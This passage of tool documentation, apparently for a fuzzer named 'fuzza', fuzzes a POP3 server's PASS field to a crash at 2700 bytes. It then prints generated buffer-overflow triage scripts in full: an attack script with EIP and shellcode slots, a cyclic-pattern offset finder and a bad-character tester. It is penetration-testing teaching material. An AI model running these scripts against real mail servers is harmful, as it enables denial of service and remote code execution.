mail.example.tld <span class=\"m\">110</span>\n+OK POP3 server mail.example.tld ready &lt;<span class=\"m\">00001</span>.544405549@mail.example.tld&gt;\nUSER <span class=\"nb\">test</span>\n+OK <span class=\"nb\">test</span> welcome here\nPASS LongPassword\n-ERR unable to lock mailbox\nQUIT\n</pre>\n<h4>Find potential overflow length</h4>\n<p>In order to fuzz the password, all previous communication must have happened. By using <code>fuzza</code>,\nthis can be achieved with the <code>-i</code> argument to specify initial data to be send and received.\nAdditionally we also want to close the connection after sending the payload (if possible).\nThis can be achieved with the <code>-e</code> option which works exactly as <code>-i</code>.</p>\n<pre>$ fuzza -i <span class=\"s1\">':.*OK POP3.*,USER test\\r\\n:.*test welcome.*'</span> -p <span class=\"s1\">'PASS '</span> -s <span class=\"s1\">'\\r\\n'</span> -e <span class=\"s1\">':.*,QUIT\\r\\n:'</span> mail.example.tld <span class=\"m\">110</span>\n\n------------------------------------------------------------\nA * <span class=\"m\">100</span>\n------------------------------------------------------------\nInit Awaiting:   <span class=\"s2\">\".*OK POP3.*\"</span>\nInit Received:   <span class=\"s2\">\"+OK POP3 server mail.example.tld ready &lt;00005.544236132@mail.example.tld&gt;\"</span>\nInit Sending:    <span class=\"s2\">\"USER test\\r\\n\"</span>\nInit Awaiting:   <span class=\"s2\">\"test welcome\"</span>\nInit Received:   <span class=\"s2\">\"+OK test welcome here\"</span>\nSending Payload: <span class=\"s2\">\"PASS \"</span> + <span class=\"s2\">\"A\"</span>*100 + <span class=\"s2\">\"\\r\\n\"</span>\nExit Awaiting:   <span class=\"s2\">\".*\"</span>\nExit Received:   <span class=\"s2\">\"-ERR unable to lock mailbox\"</span>\nExit Sending:    <span class=\"s2\">\"QUIT\\r\\n\"</span>\n...\n\n------------------------------------------------------------\nA * <span class=\"m\">2700</span>\n------------------------------------------------------------\nInit Awaiting:   <span class=\"s2\">\".*OK POP3.*\"</span>\nInit Received:   <span class=\"s2\">\"+OK POP3 server mail.example.tld ready &lt;00005.544236132@mail.example.tld&gt;\"</span>\nInit Sending:    <span class=\"s2\">\"USER test\\r\\n\"</span>\nInit Awaiting:   <span class=\"s2\">\"test welcome\"</span>\nInit Received:   <span class=\"s2\">\"+OK test welcome here\"</span>\nSending Payload: <span class=\"s2\">\"PASS \"</span> + <span class=\"s2\">\"A\"</span>*2700 + <span class=\"s2\">\"\\r\\n\"</span>\nExit Awaiting:   <span class=\"s2\">\".*\"</span>\n\nRemote service <span class=\"o\">(</span>most likely<span class=\"o\">)</span> crashed at <span class=\"m\">2700</span> bytes of <span class=\"s2\">\"A\"</span>\nPayload sent:\nPASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n</pre>\n<h4>Generate triaging scripts</h4>\n<p>Now that you know the application is potentially vulnerable at or before 2700 bytes, you will have\nto try to replicate and triage the buffer overflow. In order to do so, you can use <code>fuzza</code> to\nautomatically generate triaging scripts based on your current arguments and findings.</p>\n<p>Use the same arguments as before, add the initial length of 2700 bytes (<code>-l 2700</code>) and specify\nan output directory (<code>-g &lt;path&gt;</code>):</p>\n<pre>$ fuzza -i <span class=\"s1\">':.*OK POP3.*,USER test\\r\\n:.*test welcome.*'</span> -p <span class=\"s1\">'PASS '</span> -s <span class=\"s1\">'\\r\\n'</span> -e <span class=\"s1\">':.*,QUIT\\r\\n:'</span> -l <span class=\"m\">2700</span> -g out/ mail.example.tld <span class=\"m\">110</span>\n</pre>\n<p><code>fuzza</code> will then generate three files in <code>out/</code> directory based on your command line arguments:</p>\n<ol>\n<li><code>attack.py</code>  - used to replicate and triage buffer overflow</li>\n<li><code>pattern.py</code> - used to find offset for EIP</li>\n<li><code>badchars.py</code> - used to find any bad characters for the exploit shellcode</li>\n</ol>\n<p>Based on the above specified command line arguments, the triaging scripts will look as follows:</p>\n<p><strong><code>attack.py</code></strong></p>\n<pre><span class=\"ch\">#!/usr/bin/env python</span>\n<span class=\"sd\">\"\"\"fuzza autogenerated.\"\"\"</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">__future__</span> <span class=\"kn\">import</span> <span class=\"n\">print_function</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">str2b</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"</span>\n    <span class=\"c1\"># Python2: Unescape control chars</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'string_escape'</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">AttributeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"c1\"># Python3: Unescape control chars and convert to byte</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"utf-8\"</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'unicode-escape'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"latin1\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">socket</span><span class=\"p\">(</span><span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">AF_INET</span><span class=\"p\">,</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">SOCK_STREAM</span><span class=\"p\">)</span>\n\n<span class=\"n\">len_total</span>    <span class=\"o\">=</span> <span class=\"mi\">2700</span>                <span class=\"c1\"># Start at len_overflow and try out how much can be overwritten</span>\n<span class=\"n\">len_overflow</span> <span class=\"o\">=</span> <span class=\"mi\">2696</span>                <span class=\"c1\"># Use pattern_create.rb and pattern_offset.rb to find exact offset</span>\n<span class=\"n\">len_nop_sled</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>                   <span class=\"c1\"># Add x bytes of nops before shellcode for shellcode decoding</span>\n<span class=\"n\">eip</span>          <span class=\"o\">=</span> <span class=\"s2\">\"</span><span class=\"se\">\\x42\\x42\\x42\\x42</span><span class=\"s2\">\"</span>  <span class=\"c1\"># Change this (Keep in mind to put address in reverse order)</span>\n<span class=\"n\">shellcode</span>    <span class=\"o\">=</span> <span class=\"s2\">\"\"</span>\n\n<span class=\"n\">padding</span> <span class=\"o\">=</span> <span class=\"s2\">\"C\"</span><span class=\"o\">*</span><span class=\"p\">(</span><span class=\"n\">len_total</span> <span class=\"o\">-</span> <span class=\"n\">len_overflow</span> <span class=\"o\">-</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">eip</span><span class=\"p\">))</span> <span class=\"o\">-</span> <span class=\"n\">len_nop_sled</span> <span class=\"o\">-</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">shellcode</span><span class=\"p\">))</span>\n<span class=\"n\">buffer</span>  <span class=\"o\">=</span> <span class=\"s2\">\"A\"</span><span class=\"o\">*</span><span class=\"n\">len_overflow</span> <span class=\"o\">+</span> <span class=\"n\">eip</span> <span class=\"o\">+</span> <span class=\"s2\">\"</span><span class=\"se\">\\x90</span><span class=\"s2\">\"</span><span class=\"o\">*</span><span class=\"n\">len_nop_sled</span> <span class=\"o\">+</span> <span class=\"n\">shellcode</span> <span class=\"o\">+</span> <span class=\"n\">padding</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Trying to send </span><span class=\"si\">%s</span><span class=\"s1\"> bytes buffer...'</span> <span class=\"o\">%</span> <span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">buffer</span><span class=\"p\">))))</span>\n<span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">connect</span><span class=\"p\">((</span><span class=\"s1\">'mail.example.tld'</span><span class=\"p\">,</span> <span class=\"mi\">110</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'USER test</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'PASS '</span> <span class=\"o\">+</span> <span class=\"n\">buffer</span> <span class=\"o\">+</span> <span class=\"s1\">'</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'QUIT</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'done'</span><span class=\"p\">)</span>\n<span class=\"k\">except</span><span class=\"p\">:</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Could not connect'</span><span class=\"p\">)</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n</pre>\n<p><strong><code>pattern.py</code></strong></p>\n<pre><span class=\"ch\">#!/usr/bin/env python</span>\n<span class=\"sd\">\"\"\"fuzza autogenerated.\"\"\"</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">__future__</span> <span class=\"kn\">import</span> <span class=\"n\">print_function</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">str2b</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"</span>\n    <span class=\"c1\"># Python2: Unescape control chars</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'string_escape'</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">AttributeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"c1\"># Python3: Unescape control chars and convert to byte</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"utf-8\"</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'unicode-escape'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"latin1\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">socket</span><span class=\"p\">(</span><span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">AF_INET</span><span class=\"p\">,</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">SOCK_STREAM</span><span class=\"p\">)</span>\n\n<span class=\"n\">pattern</span> <span class=\"o\">=</span> <span class=\"p\">(</span>\n    <span class=\"s2\">\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9\"</span>\n    <span class=\"s2\">\"Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9\"</span>\n    <span class=\"s2\">\"Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9\"</span>\n    <span class=\"s2\">\"Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9\"</span>\n    <span class=\"s2\">\"Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9\"</span>\n    <span class=\"s2\">\"Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9\"</span>\n    <span class=\"s2\">\"As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9\"</span>\n    <span class=\"s2\">\"Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9\"</span>\n    <span class=\"s2\">\"Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9\"</span>\n    <span class=\"s2\">\"Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9\"</span>\n    <span class=\"s2\">\"Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9\"</span>\n    <span class=\"s2\">\"Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9\"</span>\n    <span class=\"s2\">\"Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9\"</span>\n    <span class=\"s2\">\"Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9\"</span>\n    <span class=\"s2\">\"Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9\"</span>\n    <span class=\"s2\">\"Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9\"</span>\n    <span class=\"s2\">\"Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9\"</span>\n    <span class=\"s2\">\"Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9\"</span>\n    <span class=\"s2\">\"Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9\"</span>\n    <span class=\"s2\">\"Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9\"</span>\n    <span class=\"s2\">\"Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9\"</span>\n    <span class=\"s2\">\"Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9\"</span>\n    <span class=\"s2\">\"Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9\"</span>\n    <span class=\"s2\">\"Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9\"</span>\n    <span class=\"s2\">\"Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9\"</span>\n    <span class=\"s2\">\"Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9\"</span>\n    <span class=\"s2\">\"Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9\"</span>\n    <span class=\"s2\">\"Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9\"</span>\n    <span class=\"s2\">\"Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9\"</span>\n    <span class=\"s2\">\"Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9\"</span>\n<span class=\"p\">)</span>  <span class=\"c1\"># 2700 bytes from pattern_create.rb</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Trying to send </span><span class=\"si\">%s</span><span class=\"s1\"> bytes unique chars...'</span> <span class=\"o\">%</span> <span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">pattern</span><span class=\"p\">))))</span>\n<span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">connect</span><span class=\"p\">((</span><span class=\"s1\">'mail.example.tld'</span><span class=\"p\">,</span> <span class=\"mi\">110</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'USER test</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'PASS '</span> <span class=\"o\">+</span> <span class=\"n\">pattern</span> <span class=\"o\">+</span> <span class=\"s1\">'</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'QUIT</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'done'</span><span class=\"p\">)</span>\n<span class=\"k\">except</span><span class=\"p\">:</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Could not connect'</span><span class=\"p\">)</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n</pre>\n<p><strong><code>badchars.py</code></strong></p>\n<pre><span class=\"ch\">#!/usr/bin/env python</span>\n<span class=\"sd\">\"\"\"fuzza autogenerated.\"\"\"</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">__future__</span> <span class=\"kn\">import</span> <span class=\"n\">print_function</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">str2b</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"</span>\n    <span class=\"c1\"># Python2: Unescape control chars</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'string_escape'</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">AttributeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"c1\"># Python3: Unescape control chars and convert to byte</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"utf-8\"</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'unicode-escape'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"latin1\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">socket</span><span class=\"p\">(</span><span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">AF_INET</span><span class=\"p\">,</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">SOCK_STREAM</span><span class=\"p\">)</span>\n\n<span class=\"n\">len_overflow</span> <span class=\"o\">=</span> <span class=\"mi\">2700</span>      <span class=\"c1\"># Use pattern_create.rb and pattern_offset.rb to find exact offset</span>\n<span class=\"n\">eip</span>          <span class=\"o\">=</span> <span class=\"s2\">\"B\"</span><span class=\"o\">*</span><span class=\"mi\">4</span>     <span class=\"c1\"># Ignore for badchar detection</span>\n<span class=\"n\">badchars</span> <span class=\"o\">=</span> <span class=\"p\">(</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0</span><span class=\"s2\">\"</span>\n    <span 